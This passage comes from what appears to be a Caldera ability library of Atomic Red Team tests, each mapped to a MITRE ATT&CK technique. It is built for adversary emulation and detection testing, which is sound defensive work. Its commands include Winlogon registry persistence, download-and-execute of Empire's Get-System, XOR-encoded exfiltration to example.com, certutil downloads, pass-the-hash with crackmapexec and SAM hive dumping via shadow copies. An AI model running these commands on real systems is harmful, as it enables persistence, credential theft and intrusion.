NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "ability_id": "dc74af5b90b9cbb4dcfbcaaa3e412a5e", "technique_id": "T1547.004", "tactic": "multiple", "requirements": [], "name": "Winlogon HKLM Shell Key Persistence - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "ability_id": "92578413245a3418c9dc21dc5db784ff", "technique_id": "T1547.004", "tactic": "multiple", "requirements": [], "name": "Winlogon HKLM Userinit Key Persistence - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon/logoff.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" -Force; Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" \"logon\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "ability_id": "6c2b844d6dcbe8b2c527dca7fe49a8d9", "technique_id": "T1547.004", "tactic": "multiple", "requirements": [], "name": "Winlogon Notify Key Logon Persistence - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "ability_id": "7cd5d1852fb4a534fa9b735288ca158f", "technique_id": "T1547.004", "tactic": "multiple", "requirements": [], "name": "Winlogon Shell Key Persistence - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Userinit\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL", "ability_id": "5c23188ed301af9f1b6b55d4f3f60b46", "technique_id": "T1547.004", "tactic": "multiple", "requirements": [], "name": "Winlogon Userinit Key Persistence - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic.exe group get name", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Local Groups", "ability_id": "53f5c5712bf6c008a24c38fe60700d2e", "technique_id": "T1069.001", "tactic": "discovery", "requirements": [], "name": "Wmic Group Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n", "repeatable": false, "privilege": "", "buckets": ["initial-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Phishing: Spearphishing Attachment", "ability_id": "0a69420bec84b02bd47464f6835653b1", "technique_id": "T1566.001", "tactic": "initial-access", "requirements": [], "name": "Word spawned a command shell and used an IP address in the command line", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del \"%TEMP%\\test.bin\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo \"Hello from the Windows Command Prompt!\" > \"%TEMP%\\test.bin\" & type \"%TEMP%\\test.bin\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "ability_id": "e0d7856bf28741789ecf1e0654d96995", "technique_id": "T1059.003", "tactic": "execution", "requirements": [], "name": "Writes text to a file and displays it.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1113_desktop.xwd"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "xwd -root -out /tmp/T1113_desktop.xwd; xwud -in /tmp/T1113_desktop.xwd", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "7da5d03a766f4d6b2dbaf8a8a17d53ad", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "X Windows Capture", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\")); $key = \"abcdefghijklmnopqrstuvwxyz123456\"; $cyphertext =  @(); for ($i = 0; $i -lt $plaintext.Count; $i++) {;  $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Encoding: Standard Encoding", "ability_id": "5fd6b6b635191898a202dc7c21aa6068", "technique_id": "T1132.001", "tactic": "command-and-control", "requirements": [], "name": "XOR Encoded data.", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Compress-Archive -Path PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Staged: Local Data Staging", "ability_id": "00fd3b04d79d701df0900529c1006c62", "technique_id": "T1074.001", "tactic": "collection", "requirements": [], "name": "Zip a Folder with PowerShell for Staging in Temp", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Access Token Manipulation: Token Impersonation/Theft", "ability_id": "ae73a53476995f46b71f11709f525319", "technique_id": "T1134.001", "tactic": "multiple", "requirements": [], "name": "`SeDebugPrivilege` token duplication", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.\nOpen the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "attrib.exe -r %temp%\\T1222.001_attrib\\*.* /s", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "ability_id": "5d426eb0a666aec389a212616662c66d", "technique_id": "T1222.001", "tactic": "defense-evasion", "requirements": [], "name": "attrib - Remove read-only attribute", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that\nthe victim does not see the file.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /A:H %temp%\\T1222.001_attrib_2\\T1222.001_attrib*.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mkdir %temp%\\T1222.001_attrib_2 >nul 2>&1 && echo T1222.001_attrib1 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt && echo T1222.001_attrib2 >> %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt && attrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib1.txt && attrib.exe +h %temp%\\T1222.001_attrib_2\\T1222.001_attrib2.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "ability_id": "d26a4798efaecdb29af1b400aa847ef3", "technique_id": "T1222.001", "tactic": "defense-evasion", "requirements": [], "name": "attrib - hide file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "See the raw content of a socket", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "curl #{remote.host.socket}", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl #{remote.host.socket}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data from Local System", "ability_id": "89955f55-529d-4d58-bed4-fed9e42515ec", "technique_id": "T1005", "tactic": "collection", "requirements": [], "name": "cURL socket address", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If \"Access is denied\"\nis displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, \"Successfully processed 3 files\"\nwill be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "ability_id": "69a1361f277efe9bade299f0c0a01b7a", "technique_id": "T1222.001", "tactic": "defense-evasion", "requirements": [], "name": "cacls - Grant permission to specified user or group recursively", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use certreq to download a file from the web", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\Atomic-license.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "a268a831389fc0be60eefa838ccf80e0", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "certreq download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del Atomic-license.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "1daded6839d3954bf7d12b34eb36a1b3", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "certutil download (urlcache)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"; New-Item -Path $datePath -ItemType Directory; Set-Location $datePath; certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt; Get-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "2ed8948f1c1156af47d50379e7965d90", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "certutil download (verifyctl)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chattr -i /var/spool/cron/root", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chattr -i /var/spool/cron/root", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "6030515771f31561f2b87d5832743888", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chattr - Remove immutable file attribute", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "b5d829c249e3577bebb081b82cb4edcf", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chmod - Change file or folder mode (numeric mode)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "f7de34810a85331e65c656023acb549b", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chmod - Change file or folder mode (numeric mode) recursively", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "26ed797080bee3874bb18301a88f1be9", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chmod - Change file or folder mode (symbolic mode)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "27b1c45ca84b25f3b97e298a7f2ca9c3", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chmod - Change file or folder mode (symbolic mode) recursively", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's ownership only using chown.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "689b764ccd17d8c4b587ce1a6f73cd65", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chown - Change file or folder mode ownership only", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's ownership and group information using chown.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chown", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chown", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "560a1774602fdd048fe593bf31052ef4", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chown - Change file or folder ownership and group", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's ownership and group information recursively using chown.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chown -R", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chown -R", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "12ba4650b2b42fb4b58989faacc03061", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chown - Change file or folder ownership and group recursively", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes a file or folder's ownership only recursively using chown.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification", "ability_id": "791086a91572971cf5462ebdb2c82007", "technique_id": "T1222.002", "tactic": "defense-evasion", "requirements": [], "name": "chown - Change file or folder ownership recursively", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "User enumeration", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "55678719-e76e-4df9-92aa-10655bbd1cf4", "technique_id": "T1059.001", "tactic": "collection", "requirements": [], "name": "cmd.exe information gathering", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "command execute with crackmapexec\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Use Alternate Authentication Material: Pass the Hash", "ability_id": "3e08ce272958e39325d1a9f4a2b71bda", "technique_id": "T1550.002", "tactic": "multiple", "requirements": [], "name": "crackmapexec Pass the Hash", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["1..10 | % {;   rm \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore; }"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "1..10 | % { ;  try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } 